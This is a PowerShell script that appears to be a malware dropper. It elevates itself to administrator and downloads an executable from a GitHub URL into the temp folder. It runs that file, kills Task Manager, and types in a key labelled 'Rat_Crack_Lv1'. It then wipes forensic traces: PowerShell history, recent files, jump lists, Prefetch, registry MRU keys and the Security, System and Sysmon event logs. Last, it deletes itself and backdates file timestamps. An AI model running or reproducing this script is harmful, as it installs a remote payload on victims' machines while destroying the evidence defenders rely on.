# === Self-Elevate ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# === Add Win32 API for window handling ===
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32Window {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    
    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
    
    [DllImport("user32.dll")]
    public static extern bool BringWindowToTop(IntPtr hWnd);
}
"@

# === 1. Clear Temp ===
Write-Host "[+] Clearing %TEMP%..." -ForegroundColor Cyan
$tempDir = $env:TEMP
try {
    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Temp cleared." -ForegroundColor Green
}
catch {
    Write-Host "[!] Warning: Could not fully clear temp. Continuing..." -ForegroundColor Yellow
}

# === 2. Download EXE ===
$randomGuid = [System.Guid]::NewGuid().ToString()
$exeFileName = "$randomGuid.exe"
$exePath = Join-Path $env:TEMP $exeFileName
$exeUrl = "https://raw.githubusercontent.com/TSTEAM865/fafawfqf/main/cmd.exe"

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($exeUrl, $exePath)
    $webClient.Dispose()
    if (Test-Path $exePath) {
        Write-Host "[+] Download successful." -ForegroundColor Green
    } else {
        throw "File not found."
    }
}
catch {
    Write-Host "[!] Failed to download: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# === 3. Kill conflict processes (optional) ===
Write-Host "[+] Killing taskmgr/notepad..." -ForegroundColor Cyan
foreach ($pName in @("taskmgr", "notepad")) {
    $procs = Get-Process -Name $pName -ErrorAction SilentlyContinue
    if ($procs) {
        foreach ($p in $procs) {
            try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch {}
        }
    }
}
Start-Sleep -Seconds 1

# === 4. Launch the EXE (visible) ===
Write-Host "[+] Launching EXE..." -ForegroundColor Yellow
$proc = Start-Process -FilePath $exePath -PassThru

# Wait for the window to appear
Start-Sleep -Seconds 3

# === 5. Bring the window to foreground and send the license key ===
Write-Host "[+] Sending license key via SendKeys..." -ForegroundColor Yellow

# Try to find the window by its title (adjust if the title is different)
# You can also use the process's MainWindowHandle directly
$hwnd = $proc.MainWindowHandle
if ($hwnd -eq [IntPtr]::Zero) {
    # Fallback: search by window title (guess "SKYNET" or "DEMOSHOP")
    $hwnd = [Win32Window]::FindWindow($null, "SKYNET - DEMOSHOP")
    if ($hwnd -eq [IntPtr]::Zero) {
        $hwnd = [Win32Window]::FindWindow($null, "DEMOSHOP")
    }
}

if ($hwnd -ne [IntPtr]::Zero) {
    # Bring to foreground
    [Win32Window]::SetForegroundWindow($hwnd) | Out-Null
    [Win32Window]::BringWindowToTop($hwnd) | Out-Null
    Start-Sleep -Milliseconds 500
} else {
    Write-Host "[!] Could not find window. Sending keys anyway (may type elsewhere)." -ForegroundColor Yellow
}

# Add the required assembly for SendKeys
Add-Type -AssemblyName System.Windows.Forms

# The license key
$licenseKey = "Rat_Crack_Lv1"

# Send the key + Enter
[System.Windows.Forms.SendKeys]::SendWait($licenseKey)
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

Write-Host "[+] License key sent." -ForegroundColor Green

# Optional: Hide the window after sending (0 = SW_HIDE)
# [Win32Window]::ShowWindow($hwnd, 0) | Out-Null

# === 6. Enhanced Cleanup & Anti-Forensics ===
Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan

# 1. Clear PowerShell History
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { 
    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
}

# 2. Clear Recent Files
$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

# 3. Clear Jump Lists
$jumpListPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
)
foreach ($path in $jumpListPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
    }
}

# 4. Clear Prefetch
$prefetchPath = "C:\Windows\Prefetch"
for ($i = 0; $i -lt 3; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# 5. Clear INetCache
$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
if (Test-Path $ieCache) {
    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# 6. Clear Temp again
Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

# 7. Clear Registry MRU
$mruKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
)
foreach ($key in $mruKeys) {
    if (Test-Path $key) {
        Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
        New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

# 8. Clear Event Logs
$logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Sysmon/Operational")
foreach ($logName in $logNames) {
    try { wevtutil cl $logName 2>$null } catch {}
}

# 9. Delete the downloaded EXE
Start-Sleep -Seconds 2
if (Test-Path $exePath) { 
    try { Remove-Item $exePath -Force -ErrorAction SilentlyContinue } catch {}
}

# 10. Delete the script itself
if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue 
}

# 11. Force GC
[GC]::Collect()
Start-Sleep -Seconds 2

# 12. Timestomp PowerShell history
Write-Host "[+] Timestomping..." -ForegroundColor Cyan
$timestompCmd = @'
$inst = (Get-Item C:\Windows).CreationTime
$diff = ((Get-Date) - $inst).TotalDays
if ($diff -lt 0) { $diff = 0 }
if ($diff -lt 7) { 
    $targetDate = $inst.Date.AddHours((Get-Random -Min 12 -Max 23)).AddMinutes((Get-Random -Min 0 -Max 60)) 
} else { 
    $max = [Math]::Min(15, [Math]::Floor($diff))
    $targetDate = (Get-Date).AddDays(-(Get-Random -Min 7 -Max ($max + 1))).AddHours(-(Get-Random -Min 0 -Max 24)).AddMinutes(-(Get-Random -Min 0 -Max 60)) 
}
$h = (Get-PSReadLineOption).HistorySavePath
(Get-Content $h) | Where-Object { $_ -notmatch 'LastWriteTime|CreationTime' } | Set-Content $h
(Get-Item $h).LastWriteTime = $targetDate
$f1 = Split-Path $h -Parent
try { (Get-Item $f1).LastWriteTime = $targetDate } catch {}
try { (Get-Item (Split-Path $f1 -Parent)).LastWriteTime = $targetDate } catch {}
'@
powershell -NoProfile -Command $timestompCmd

exit
